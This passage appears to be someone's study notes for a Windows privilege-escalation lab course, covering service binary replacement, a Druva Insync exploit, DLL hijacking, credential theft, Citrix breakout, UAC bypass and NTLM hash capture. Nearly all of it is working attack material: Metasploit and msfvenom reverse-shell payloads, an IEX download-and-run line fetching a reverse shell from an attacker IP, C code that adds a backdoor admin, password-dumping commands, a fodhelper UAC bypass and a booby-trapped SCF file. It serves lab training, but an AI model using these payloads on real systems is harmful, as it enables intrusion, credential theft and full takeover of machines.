```
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

→ should now show **your user `:(F)`** (full control).

### Step 4 — Overwrite with the CLEAN copy

The moved file (step 3) is **corrupted**, so put the good spare in its place. Rename it to the real name (drop the `2`). **cmd only — not PowerShell:**

```
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Why two copies (the #1 gotcha):** step 3 **corrupts** the file it moves. If you try to run that corrupted one, the service fails with **error 216** (not a valid binary). The clean spare (`maintenanceservice2.exe`) is what you drop in at step 4.
### Step 5 — Start your Metasploit handler (attack box)

Create a text file named handler.rc with those lines inside. Easiest way:
```
cat > handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.3
set LPORT 8443
exploit
EOF
```

Then run Metasploit and tell it to use that file: `sudo msfconsole -r handler.rc`

(-r = “run this resource file”). Or skip the file entirely — just open msfconsole and type the commands by hand:
### Step 6 — Start the service → SYSTEM shell

```
net start MozillaMaintenance
```

→ it errors out ("not responding"), but your payload fires → **Meterpreter as NT AUTHORITY\SYSTEM**. Confirm:

```
meterpreter > getuid      # NT AUTHORITY\SYSTEMmeterpreter > hashdump
```



---
---

# Section 19 - Vulnerable Services (3rd-party software)

Even a **fully patched** box can be rooted if it runs **vulnerable third-party software**. Many apps install a **service running as SYSTEM** — if the app has a known exploit, you get **SYSTEM**.

**Flow:** find installed software → pick suspicious third-party apps → check for a known exploit → confirm it's running → run it with a reverse-shell payload.

## Step 1 — Find the software

**Installed apps** (built-in, fast, quiet — covers 32-bit too):

```

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion, Publisher | sort DisplayName
```

**Also catch portable / cracked apps** (these don't show in the list above — no installer = no uninstall entry):

```

Get-Process | select Name, Path              
# running programs

Get-CimInstance win32_service | select Name, PathName, StartName          # services + their .exe
```



## Step 2 — Narrow it down (don't check thousands)

Keep only the **few that matter**:

|✅ Keep (likely target)|❌ Drop|
|---|---|
|Third-party (non-Microsoft)|VC++ runtimes, VMware Tools, Windows updates|
|Runs as a **SYSTEM service**|Normal user apps, no service|
|**Listens on a local port**|Standard Microsoft components|
|Backup / AV / VPN / agent software|—|

Find the high-value ones fast:

```
Get-CimInstance win32_service | where {$_.StartName -eq "LocalSystem"}    
# services as SYSTEM
netstat -ano                            # what's listening
winpeas.exe                             # auto-flags vulnerable software
```



## Step 3 — Check for a known exploit

```
searchsploit <app name>          # e.g. searchsploit druva insync
```

or Google `"<app> <version> exploit"`. **Note the port** the exploit uses.



## Step 4 — Confirm it's running, then exploit

**Confirm** the service is up on the expected port (swap values for your app):

```
netstat -ano | findstr <PORT>
```

```
Get-Service | ? {$_.DisplayName -like '<AppName>*'}
```

## Step 5 — Exploit

The PoC (`druva.ps1`, EDB-ID **49211**) sends the command in its **`$cmd`** line to the Druva service on port 6064, which runs it **as SYSTEM**. We make `$cmd` download + run a reverse shell.

**ON ATTACK BOX:**

1. Get the reverse-shell script and add the launch line (your IP + port):

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1

echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.66 -Port 5555' >> shell.ps1
```

2. Host it:

```
python3 -m http.server 8080
```

3. New terminal — start listener:

```
nc -lvnp 5555
```

**ON TARGET:**

4. Get the PoC and open it:

```
# (download druva.ps1 to the target, then)
notepad .\druva.ps1
```

5. Set the **`$cmd`** line to exactly this (single quotes inside — no escaping):

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.66:8080/shell.ps1')"
```

Save.

6. Allow scripts + run:

```
Set-ExecutionPolicy Bypass -Scope Process
.\druva.ps1
```

→ your listener catches a **SYSTEM shell**. Confirm: `whoami`.

---
---

# Section 20 - DLL Injection & DLL Hijacking

`DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

## DLL Injection — 4 methods (concept only, rarely hand-done in exam)

Injecting your DLL into a **running** process so your code runs in it:

|Method|Simple idea|
|---|---|
|**LoadLibrary**|Most common. Use the Windows `LoadLibrary` API to load your DLL into the target process (via `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`).|
|**Manual Mapping**|Advanced. Load the DLL into memory **yourself** (no `LoadLibrary`) — avoids detection, because security tools watch `LoadLibrary`.|
|**Reflective DLL Injection**|The DLL loads **itself** from memory (has its own mini loader `ReflectiveLoader`). Very stealthy — never touches disk.|
|**DLL Hijacking**|⭐ The practical privesc one — see below.|

## DLL Hijacking (the privesc technique)

**Idea:** a program tries to load a DLL **without giving its full path**. Windows then **searches folders in order** to find it. If you can **drop your malicious DLL in a folder Windows checks first** (before the real one), your DLL gets loaded → **your code runs as that program** (SYSTEM if the program is SYSTEM).

### DLL search order (where Windows looks)

With **Safe DLL Search Mode** (default ON):

1. The app's own folder
2. System folder (`C:\Windows\System32`)
3. 16-bit system folder
4. Windows folder
5. **Current directory**
6. Folders in **PATH**

> The weak spots for you: a folder **early in this list that you can write to** (like the app's folder, or a writable PATH folder).

### Steps

0. **Choose WHICH program to target (before touching procmon).**  
You only care about programs worth hijacking — ones that run with **high privileges**:

- **Services running as SYSTEM** → `Get-CimInstance win32_service | where {$_.StartName -eq "LocalSystem"}`
- **Auto-start services / scheduled tasks** (they run on their own, so your DLL fires without you)
- **Third-party apps** (more likely to load DLLs from writable folders than Windows’ own)

**1. Find a DLL the program loads (or fails to find).** Use **Process Monitor (procmon)** from Sysinternals:

- Filter: `Process Name is <app>.exe`
- Filter: `Operation is Load Image` → see DLLs it loads
- Filter: path ends in `.dll` + result **`NAME NOT FOUND`** → see DLLs it **looks for but can't find** ← best target

**2. Check you can write to one of the search folders** (`icacls` on the app's folder / a PATH folder).

**3. Build your malicious DLL** — two common approaches below.

**4. Drop it with the right name in that folder → run the program → your code runs.**

---

## Two ways to build the hijack DLL

### A. Missing DLL (easiest) — the app looks for a DLL that doesn't exist

If procmon shows a DLL with **`NAME NOT FOUND`** (e.g. `x.dll`), just make your own `x.dll`. Its `DllMain` runs when loaded:

```
#include <windows.h>BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {    if (reason == DLL_PROCESS_ATTACH) {        // your code here — e.g. add admin / reverse shell        system("cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add");    }    return TRUE;}
```

Compile → name it `x.dll` → put it where the app looks → run the app → **your code runs**.

### B. DLL Proxying — the DLL exists, so forward the real functions + add your code

Use this when the app **actually uses** the DLL (not just "NAME NOT FOUND"). If you just replace it, the app crashes (missing functions). So your DLL must **forward the real functions through** — then the app works _and_ your code runs.

**Workflow:**

1. **Find the DLL + its exported functions.** procmon (`Load Image`) gives the DLL; list its exports with a PE tool:
    - Windows: **PE-bear**, **DLL Export Viewer**, or **Process Explorer**
    - Linux: `rabin2 -E library.dll`
2. **Keep the original** — rename the real `library.dll` → `library.o.dll` (so your proxy can still call it).
3. **Generate the proxy automatically** (don't hand-write a wrapper per function). Tools build the forwarding stub for every export + leave a spot for your payload:
    - **Spartacus** (also _finds_ hijackable DLLs), **SharpDLLProxy**, **DLLirant**
4. **Name it `library.dll`**, drop it in the app's folder, run the app → your payload runs, and the proxy forwards the real calls so the app behaves normally.

> **Why use it:** stealthier than the missing-DLL method — the app keeps working. Choose proxying when the DLL is **used**, and the missing-DLL method (A) when it's **NAME NOT FOUND**.

---

## Make the payload DLL with msfvenom (quick way)

Instead of writing C, generate a DLL payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f dll -o x.dll
```

Name it to match the target DLL, drop it in the writable search folder, run the app → reverse shell.



---
---
# Section 21, 22, 23 - Credential Theft

## 0. Automated tools (run first)

|Command|What it does|
|---|---|
|`.\lazagne.exe all`|**Auto-dump ALL stored passwords** (browsers, Wi-Fi, RDP, PuTTY, WinSCP, DBs, memory). Best first move.|
|`.\lazagne.exe -h`|Help / list modules (e.g. `lazagne.exe browsers`).|
|`winpeas.exe`|Flags saved creds, autologin, configs with passwords.|
|`Invoke-SessionGopher -Thorough`|Hunt saved **PuTTY/WinSCP/RDP/FileZilla** session creds (`-AllDomain` for the domain).|
|`Invoke-SelfSearch -Mailbox user@corp.com` _(MailSniper)_|Search **Outlook/Exchange mailboxes** for passwords in emails.|

> ⚠️ LaZagne/SharpChrome are **AV-flagged** (known cred-dumpers). If blocked, use the manual searches below. Browsers → §5 · Network shares → §8.

---

## 1. Search file CONTENTS for "password"

| Command                                                                                                                                                                                                                 | What it does                                                                 |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `findstr /SI "password" *.xml *.ini *.txt *.config`                                                                                                                                                                     | Search these types (+subfolders), show matching **lines**.                   |
| `findstr /SPIN "password" *.*`                                                                                                                                                                                          | Recursively search **all** files (skip binaries, line ).                     |
| `findstr /SIM /C:"password" *.xml *.ini *.config`                                                                                                                                                                       | **Filenames only** (`/M`) — quick "which files".                             |
| `Get-ChildItem C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -EA Ignore \| Select-String "password"`                                                                                                            | PowerShell: search contents recursively.                                     |
| `Get-ChildItem C:\Users -Recurse -Include *.xml,*.ini,*.txt,*.config,*.ps1,*.bat,*.yml,*.json -EA Ignore \| Select-String "password","pwd","cred","secret","api[_-]?key","token","connectionstring"`                    | **Wide sweep** — many secret words, many file types.                         |
| `Get-ChildItem C:\Users,C:\inetpub,C:\ProgramData -Recurse -Include *.xml,*.ini,*.config,*.txt,*.ps1 -EA Ignore \| Select-String 'password\s*[=:]\s*\S+' \| where { $_ -notmatch 'URL\|http\|Reset\|Domain\|Service' }` | **Precise sweep** — matches real `password = value`, skips URL/config noise. |

- **Save output:** add `\| Out-File $env:USERPROFILE\loot.txt`. ⚠️ path must **exist + be writable** (`$env:USERPROFILE`, `$env:TEMP`, `.\` — not `C:\` root).
- **findstr flags:** `/S` subfolders · `/I` ignore case · `/N` line numbers · `/M` filenames only · `/P` skip binaries · `/C:"..."` exact phrase.

---

## 2. Search file NAMES (credential-looking files)

| Command | What it does |
|---------|--------------|
| `dir /S /B C:\*pass* C:\*cred* C:\*vnc* C:\*.config` | Files whose **name** looks credential-related. |
| `Get-ChildItem C:\ -Recurse -Include *.rdp,*.vnc,*.cred,*.config,*.gpg -EA Ignore` | RDP/VNC/cred/config/GPG files. |
| `Get-ChildItem C:\ -Recurse -Include *.kdbx,*.kdb,*.psafe3,*.opvault,*.1pif -EA Ignore` | **Password-manager vaults** (KeePass, Password Safe, 1Password). |
| `Get-ChildItem C:\ -Recurse -EA Ignore \| where { $_.Name -match "keepass\|1password\|lastpass\|bitwarden\|thycotic\|cyberark" }` | Find password-manager **apps/folders**. |

- **Too many results?** Filenames = a candidate list. Few/specific (`.kdbx`,`.rdp`) → open each. Thousands (`.config`) → **grep inside** them:
  `Get-ChildItem C:\ -Recurse -Include *.config -EA Ignore | Select-String "password","cred","connectionstring"`
- **Found a KeePass `.kdbx`?** Crack it (on attack box):
  `keepass2john DB.kdbx > kp.hash` → `hashcat -m 13400 kp.hash rockyou.txt`


---

## 3. PowerShell history & saved credentials

|Command|What it does|
|---|---|
|`(Get-PSReadLineOption).HistorySavePath`|Show where PowerShell history is saved.|
|`gc (Get-PSReadLineOption).HistorySavePath`|Read **your** history (passwords typed into commands).|
|`foreach($u in (ls C:\users).fullname){cat "$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -EA SilentlyContinue}`|Read **all users'** history you can access.|
|`(Import-Clixml 'C:\scripts\pass.xml').GetNetworkCredential() \| fl Username,Password`|Decrypt a saved **PowerShell credential** (.xml) → plaintext.|

> **Import-Clixml:** the `.xml` is DPAPI-encrypted to that **user + machine** — only decrypts when you're **that user on that box**.

---

## 4. Windows credential store & other spots

|Command|What it does|
|---|---|
|`cmdkey /list`|**Saved Windows creds** (RDP/network). Reuse: `runas /savecred /user:<user> cmd`.|
|`dir /S C:\unattend.xml C:\Windows\Panther\unattend.xml C:\sysprep.inf`|**Unattended install files** — often hold install/admin passwords.|
|`findstr /SI "connectionString password" C:\inetpub\*.config`|**IIS web.config** — DB connection strings / passwords.|
|`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`|**Autologon** creds (`DefaultUserName` / `DefaultPassword`).|
|`schtasks /query /fo LIST /v` _(or `C:\Windows\System32\Tasks\`)_|**Scheduled tasks** — their XML sometimes stores creds.|
|`gci "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite"`|**Sticky Notes** DB — people stash passwords here. Read it below.|

**Read the Sticky Notes DB:**

```
# PowerShell (needs PSSQLite module)

Install-Module PSSQLite -Scope CurrentUser -Force

$db = (gci "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite").FullName

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | fl
```

```
# or on attack box

sqlite3 plum.sqlite "SELECT Text FROM Note;"

strings plum.sqlite | grep -i pass        # quick peek, no sqlite3
```

Or you can just simply base-encode it on windows, copy it on attack machine, decode and read!!

```
# On target:

[Convert]::ToBase64String((Get-Content C:\loot.txt -Encoding Byte)) > ppp

# Copy the output,  then on attack box:

base64 -d ppp

```

---

## 5. Browser-saved passwords

Browsers store logins encrypted (DPAPI) — tools decrypt them, or grab the files and crack offline.

| Browser           | Command                                                                                                    | Notes                                                       |
| ----------------- | ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Chrome**        | `.\SharpChrome.exe logins /unprotect`                                                                      | Plaintext logins. Also `cookies`, `history`.                |
| **Edge**          | `.\SharpChrome.exe logins /unprotect /browser:edge`                                                        | Edge is Chromium — same tool.                               |
| **Firefox**       | `Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -Include logins.json,key4.db -Recurse -EA Ignore` | Grab both files → crack offline with **`firefox_decrypt`**. |
| **Any (easiest)** | `.\lazagne.exe browsers`                                                                                   | All browsers in one shot.                                   |

> DPAPI: SharpChrome/LaZagne must run **as that user** to decrypt. Firefox files crack **offline** (no DPAPI).

---

## 6. Saved Wi-Fi passwords

|Command|What it does|
|---|---|
|`netsh wlan show profile`|List saved Wi-Fi network names.|
|`netsh wlan show profile <SSID> key=clear`|Show that Wi-Fi's **password** in plaintext.|
|`(netsh wlan show profiles) \| Select-String "All User" \| %{($_ -split ":")[1].Trim()} \| %{netsh wlan show profile name="$_" key=clear}`|**Dump ALL Wi-Fi passwords** at once.|

---

## 7. Registry (most-missed — high value)

|Command|What it grabs|
|---|---|
|`reg query HKLM /f password /t REG_SZ /s`|Search **whole HKLM** for "password".|
|`reg query HKCU /f password /t REG_SZ /s`|Search **whole HKCU** for "password".|
|`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`|PuTTY saved sessions (proxy creds, hosts).|
|`reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password`|VNC password.|
|`reg query "HKLM\SOFTWARE\TightVNC\Server" /s`|TightVNC password.|
|`reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s`|SNMP community strings.|

**Recon combo (run several at once):**

```
cmdkey /list ; reg query HKLM /f password /t REG_SZ /s ; netsh wlan show profiles   # PowerShell (chain with ;)
```

```
cmdkey /list & reg query HKLM /f password /t REG_SZ /s & netsh wlan show profiles    :: cmd (chain with &)
```

> ⚠️ **PowerShell chains with `;`, cmd with `&`.** `&` in PowerShell = "ampersand not allowed" error.

---

## 8. Network-wide — hunt creds across SHARES (other machines)

Everything above = the **local box**. These crawl **network shares across the domain** for secrets on _other_ machines (mostly AD modules).

|Tool|Runs on|Command|What it does|
|---|---|---|---|
|**Snaffler**|Windows (domain box)|`Snaffler.exe -s -o snaffler.log -d <domain> -n <dc>`|Crawls shares, greps **inside** files, colour-codes (red = creds).|
|**NetExec (nxc)**|Linux|`nxc smb <subnet> -u user -p pass --shares` · `-M spider_plus`|Lists shares across hosts, spiders their files.|
|**MANSPIDER**|Linux|`manspider <subnet> -u user -p pass -c password cred secret`|**Searches INSIDE** files (even Word/PDF) for keywords.|

> Snaffler flags: `-s` screen · `-o` log · `-d <domain>` · `-n <dc>` host · `-i C:\` also a local path. Which: Windows → **Snaffler** · Linux → **NetExec** (all-rounder) / **MANSPIDER** (search inside files). All **noisy + AV-flagged**.



---
---


# Section 24 - Citrix / Restricted Desktop Breakout 

Companies give remote access through locked-down desktops (**Citrix, Terminal Services, AWS AppStream, Kiosk, CyberArk PSM**). You can only use a few allowed apps — no cmd, no PowerShell, no browsing `C:\`. The goal is to **"break out"** of that cage → get a **cmd shell** → then **escalate to admin**.

**3-step methodology:**

1. Get a **Dialog Box** (Open/Save/Print window from an allowed app).
2. Use it to get **command execution** (reach cmd.exe).
3. **Escalate privileges** to admin/SYSTEM.


## Step 1 — Get a Dialog Box

Any allowed app with **Save / Open / Browse / Import / Export / Print / Help** can pop a Windows dialog box. Common ones: **Paint, Notepad, WordPad**.

> Example: open **Paint → File → Open** → you now have a file dialog you can abuse.


## Step 2 — Break out using the Dialog Box → get cmd

The dialog box's **"File name" field** lets you type paths and launch things. Set **File-Type = All Files** so everything shows.

### Try these in order (easiest first — most need NO files)

| #   | Technique                      | How                                                                                                                                                                                                                                                               |
| --- | ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | **Type cmd's path directly**   | In the File name field type `C:\Windows\System32\cmd.exe` → Enter → cmd opens. **Nothing to make.**                                                                                                                                                               |
| 2   | **cmd via UNC back door**      | `\\127.0.0.1\c$\Windows\System32\cmd.exe` → opens cmd even if the normal path is blocked.                                                                                                                                                                         |
| 3   | **Modify a shortcut**          | Right-click any `.lnk` → Properties → set **Target** = `cmd.exe` → run it.                                                                                                                                                                                        |
| 4   | **`.bat` script**              | `echo cmd > evil.bat` → run it → cmd window opens (if `.bat` auto-runs).                                                                                                                                                                                          |
| 5   | **Browse local files (UNC)**   | `\\127.0.0.1\c$\users\pmorgan` → reach the box's own folders File Explorer blocks.                                                                                                                                                                                |
| 6   | **Reach your SMB share**       | `\\<ATTACK_IP>\share` → access/run tools from your attack box.                                                                                                                                                                                                    |
| 7   | **Run your own binary**        | Right-click `pwn.exe` from the share → **Open** → spawns cmd (fallback when cmd.exe is name-blocked).                                                                                                                                                             |
| 8   | **Alternate explorer/regedit** | If File Explorer or regedit is blocked, bring your own portable copy via the share: **Explorer++ / Q-Dir** (browse + **copy** files) · **SimpleRegEdit / UberRegEdit** (edit registry). Only needed _before_ you have cmd — after, use built-in `copy` and `reg`. |

### If `cmd.exe` itself is blocked (AppLocker / SRP)
| Try                        | Command                                                                                                  |
| -------------------------- | -------------------------------------------------------------------------------------------------------- |
| **PowerShell instead**     | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (often allowed when cmd isn't)               |
| **Copy cmd to a new name** | `copy C:\Windows\System32\cmd.exe C:\Users\Public\notcmd.exe` → run `notcmd.exe` (beats name/path rules) |
| **Your own binary**        | `pwn.exe` — not named cmd.exe, so name-based rules miss it                                               |


If these don't work, make tools on your attack box, **Host your SMB share (attack box) to pass tools in:**

```bash
# newer:
impacket-smbserver share $(pwd) -smb2support

# older 

smbserver.py -smb2support share $(pwd)
```

#### Option 1: **`pwn.exe`** = tiny custom binary that just launches cmd. 

Make `pwn.c`, then cross-compile on your attack box:

```
#include <stdlib.h>int main() { system("C:\\Windows\\System32\\cmd.exe"); }
```

```bash
# compile for Windows on Linux:

x86_64-w64-mingw32-gcc pwn.c -o pwn.exe
```

#### Option 2: **Make a malicious `.lnk` shortcut 

A shortcut that launches cmd when clicked; make one if there's no existing shortcut to edit), on attack box or in PS:**

```powershell

$s=(New-Object -COM WScript.Shell).CreateShortcut("$pwd\evil.lnk");$s.TargetPath="C:\Windows\System32\cmd.exe";$s.Save()
```

#### Option 3: **Make the `.bat` breakout file

A text file holding `cmd`; running it opens a cmd window (works if `.bat` auto-runs, no .exe needed):**

```
echo cmd > evil.bat
```

> **Easiest combo:** Paint → File → Open → File-Type "All Files" → type `\\<ATTACK_IP>\share` → right-click `pwn.exe` → Open → **cmd!**


## Step 3 — Escalate privileges

Now you have cmd — enumerate + escalate like any Windows box.

**Transfer + run enumeration tools** (host on attack box with the SMB/HTTP server above):

```powershell

# enable PowerShell
powershell -ep bypass 


# download from your attack box

iwr http://<ATTACK_IP>:8080/winPEAS.exe -o C:\Users\Public\winpeas.exe -UseBasicParsing

iwr http://<ATTACK_IP>:8080/PowerUp.ps1 -o C:\Users\Public\PowerUp.ps1 -UseBasicParsing

# if the target has PS version less then 3

copy \\10.10.14.66\share\winPEAS.exe C:\Users\Public\win.exe
C:\Users\Public\win.exe

# run them

C:\Users\Public\winpeas.exe

Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

## Common quick win here — AlwaysInstallElevated

If this key is set, **any `.msi` runs as SYSTEM** → easy admin.

**Check it:**

```powershell

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

→ **both** must be `0x1` to be exploitable. Then you can go for Option B!

#### **Exploit (Option A) — PowerUp makes an MSI that adds an admin user:**

```
Import-Module .\PowerUp.ps1

Write-UserAddMSI
```

→ creates `UserAdd.msi`. Run it (`msiexec /quiet /i UserAdd.msi` or double-click) → creates admin user `backdoor:T3st@123`. ⚠️ Password must meet complexity rules or it errors.

#### **Exploit (Option B) — msfvenom MSI (reverse shell as SYSTEM), if no PowerUp:**

Make a no-callback MSI that adds a local admin (attack box)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=443 -f msi -o evil.msi
```

```
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```

(start `nc -lvnp 443` first → catch a SYSTEM shell.)

**Switch to the new admin (Option A):**

```
runas /user:backdoor cmd
```

#### Or you may need to bypass UAC first then escape privilege and then again UAC bypass!


## Step 4 — Bypass UAC (the new admin is still filtered)

`backdoor` is in Administrators but can't read `C:\Users\Administrator` → **UAC filtered token** (same as the UAC module). Bypass it.

**Option A — Bypass-UAC script:**

```
Import-Module .\Bypass-UAC.ps1

Bypass-UAC -Method UacMethodSysprep
```

→ opens a **high-integrity** PowerShell. Confirm with `whoami /priv`.

**Option B — fodhelper (built-in, no upload):**

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force

Start-Process "C:\Windows\System32\fodhelper.exe"

# cleanup: Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

→ spawns a **high-integrity** cmd. Then read the flag:

```
whoami /groups        :: confirm High Mandatory Level

type C:\Users\Administrator\Desktop\flag.txt
```

> `fodhelper` fails at UAC level **"Always notify" (0x5)** — then use the module's SystemPropertiesAdvanced DLL hijack. Check level: `reg query HKLM\...\Policies\System /v ConsentPromptBehaviorAdmin`.


## Questions : Citrix Breakout — Mistakes I Made (and how to fix them)

> I got the cmd shell by changing the location of the shortcut file from Properties to `C:\...\cmd.exe`.

1. I put the tools on the wrong machine. I downloaded the tools onto the target itself and tried to copy them from there, which was messy and probably out of scope. What I should do: keep the tools on the **first box I jumped to over RDP** (tools were already there) and reach them from the Citrix window over a share.
    
2. The SMB server needs root. When I started it, it needed `sudo` because it uses port 445. Any port under 1024 needs root permission to open. So I did `sudo -s` first, then started it. Also `impacket-smbserver` didn't work as the Windows was old. Had to do `smbserver.py`.
    
3. I forgot to get the Ubuntu box's IP (1st box where I jumped). I assumed the RDP IP was the same as the share host — it wasn't. I need the Ubuntu machine's own IP for `\\IP\share`.
    
4. Always run `dir \\IP\share\` first to see the exact names, then copy them exactly.
    
5. I typed the wrong path while trying to get the tools from the SMB share. I added `\Desktop\` to the UNC path, but the share root was the Desktop already. So the file sits right at `\\IP\share\file` — no extra folder.
    
6. `iwr` didn't work. The box was really old (Windows 7, PowerShell v2), and `iwr` only works on newer PowerShell. So I should just copy from the SMB share instead.
    
7. Always copy the tools in `C:\Users\Public` (a folder you can 'write to' from anywhere as any user). Cause if you bypass and runas another user, you may not be able to access the other user's directories to access the tools.
    
8. The fodhelper UAC bypass failed. It said "file not found" because fodhelper only exists on Windows 10+, and this was Windows 7. On old Windows I should use `Bypass-UAC -Method UacMethodSysprep` instead.
    
9. The UAC bypass script wouldn't run ("execution of scripts is disabled"). Fix: run `Set-ExecutionPolicy Bypass -Scope Process -Force` first, then import it. Got in!!





---
---

# Section 25 - Interacting with Users (steal creds) 

Sometimes, the easiest way to find credentials is to **observe what other users do**, rather than attack the system directly. Users may run commands containing passwords, access shared folders, or interact with vulnerable software. During a pentest, you can look for exposed credentials in network traffic, process command lines, event logs, or authentication requests triggered when users browse a shared folder. When normal privesc is exhausted, **target the users** — catch their passwords by sniffing traffic, watching commands they run, or **tricking them into leaking their NTLM hash** by browsing a file share. Then crack the hash offline.

**4 techniques:**

| Technique | How it works |
|-----------|--------------|
| 1. Traffic capture | Sniff cleartext creds on the wire (Wireshark/tcpdump) |
| 2. Process command lines | Watch for passwords typed into commands/scheduled tasks |
| 3. Vulnerable service + user action | Plant a file a service/user will run (e.g. Docker Desktop bug) |
| 4. SCF/.lnk on a share ⭐ | Drop a booby-trapped file → user browses the folder → leaks their NTLM hash |

---

## 1. Traffic capture

If **Wireshark/Npcap** is installed, even a normal user can often capture traffic (the "restrict to Administrators" option is **off by default**) → you might catch cleartext creds (e.g. FTP `USER`/`PASS`).

- On the target: run **Wireshark**, or `tcpdump` to a file: `sudo tcpdump -i tun0 -w capture.pcap`
- On your attack box: **net-creds** auto-extracts passwords/hashes from a live interface or a `.pcap`:
```bash
net-creds.py -i tun0        # live
net-creds.py -p capture.pcap # from a file
```
> Worth trying if you're placed on a box/attack machine inside the network — just let it run a while.

---

## 2. Process command lines

Scheduled tasks / scripts sometimes **pass passwords on the command line**. This loop snapshots running processes every ~1s and prints new ones (catching creds as they flash by):

```powershell
while($true){
  $p1 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $p2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $p1 -DifferenceObject $p2
}
```
Run it straight from memory (host on attack box):
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```
→ example catch: `net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd` → **free domain creds**.

---

## 3. Vulnerable service needing user interaction

Some apps load a file that **doesn't exist**, from a folder **you can write to** — plant your own exe there, and it runs when the app starts or a user acts.

**Example — Docker Desktop (CVE-2019-15752):** old Docker looks for `docker-credential-wincred.exe` in `C:\ProgramData\DockerDesktop\version-bin\`, which is **writable by `BUILTIN\Users`**. Drop your exe there → runs when Docker starts or a user runs `docker login`.
> Not instant (needs a restart/user action) — plant it and check back on long engagements. Lesson: **always enumerate installed software thoroughly.**

---

## 4. ⭐ SCF / .lnk on a file share → capture NTLM hash

**The idea:** drop a booby-trapped file on a share. When a user just **browses the folder**, Windows Explorer automatically tries to load an **icon from a UNC path** you control → their machine authenticates to **you** → you capture their **NTLMv2 hash** → crack it offline.

Microsoft patched the SCF auto-icon-load around **2017–2018**, so anything **Server 2016/2019 or modern Win10** → SCF won’t fire. **Honest practical approach:** you often don’t need to guess. **Check the OS** (`wmic os get Caption`) → if it says **2016/2019 or Win10**, go straight to `.lnk`.

### Step 1 — Make the malicious SCF file

Name it `@Inventory.scf` (the `@` makes it sort to the **top** so it loads first; pick a name that fits the folder):

```ini
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
Put your **attack-box IP** in `IconFile`. 

**Find a writable share/folder first** (the share root is often READ-only — you need a writable subfolder) (nxc does NOT show per-folder READ/WRITE recursively like smbmap does.):

```
# list shares + permissionsnxc 

smb <ip> -u <user> -p '<pass>' --shares

# see which FOLDERS inside a share you can write to (recursive)

smbmap -H <ip> -u <user> -p '<pass>' -r 'Department Shares'
```

→ ignore system shares (`C$`,`ADMIN$`,`IPC$`); find the folder marked **WRITE**. You check **folders**, not the files inside.

**Drop the SCF into that folder:**

```
smbclient "\\\\<ip>\\Department Shares" -U '<user>%<pass>'

smb: \> cd <writable_subfolder>
smb: \> put @Inventory.scf
```

> If `put` gives `NT_STATUS_ACCESS_DENIED`, that folder is read-only — try another. Keep the `@` in the name (sorts to top so it loads first).

### Step 2 — Catch the hash (pick by where you're capturing)

**Linux attack box → Responder:**

```bash
sudo responder -wv -I tun0
```
**Windows box (no Linux) → Inveigh** (Responder is Linux-only):

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y
# or the C# version:
.\Inveigh.exe
```
When a user browses the folder → you catch their hash:

```
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c...:afb6...:0101...
```

### Step 3 — Crack it with Hashcat

Save the captured line to a file first, then crack:

```bash
